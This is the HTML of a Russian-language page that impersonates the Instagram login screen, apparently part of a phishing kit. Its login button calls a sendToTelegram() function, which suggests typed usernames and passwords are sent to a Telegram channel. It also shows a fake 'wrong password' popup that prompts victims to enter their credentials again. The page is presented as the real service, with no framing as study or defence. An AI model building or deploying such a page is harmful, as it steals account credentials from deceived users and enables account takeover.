<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" type="image/png" href="./a39858011887b289e54ee4883abce777.jpg">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <img src="./image-removebg-preview (30).png" alt="Instagram Logo" class="logo">
            <input type="text" id="username" placeholder="Телефон, имя пользователя или эл. адрес">
            <input type="password" id="password" placeholder="Пароль">
            <button class="login-btn" onclick="sendToTelegram()">Войти</button>
            <div class="separator">
                <span>ИЛИ</span>
            </div>
            <button class="fb-login"> Войти через Facebook</button>
            <a href="#" class="forgot">Забыли пароль?</a>
        </div>
        <div class="register-box">
            У вас нет аккаунта? <a href="#">Зарегистрироваться</a>
        </div>
        <div class="app-links">
            <p>Установите приложение.</p>
            <div class="buttons">
                <img src="./gp-1.png" alt="Google Play">
            </div>
        </div>
    </div>

    <!-- Модальное окно ошибки -->
    <div id="error-popup" class="error-popup">
        <div class="error-content">
            <span id="error-close" class="error-close">&times;</span>
            <p id="error-message">Ошибка! Неправильный логин или пароль. Попробуйте снова.</p>
        </div>
    </div>

    <footer>
        <p>Meta · Информация · Блог · Вакансии · API · Конфиденциальность · Условия</p>
    </footer>

    <script src="script.js"></script>
</body>
</html>
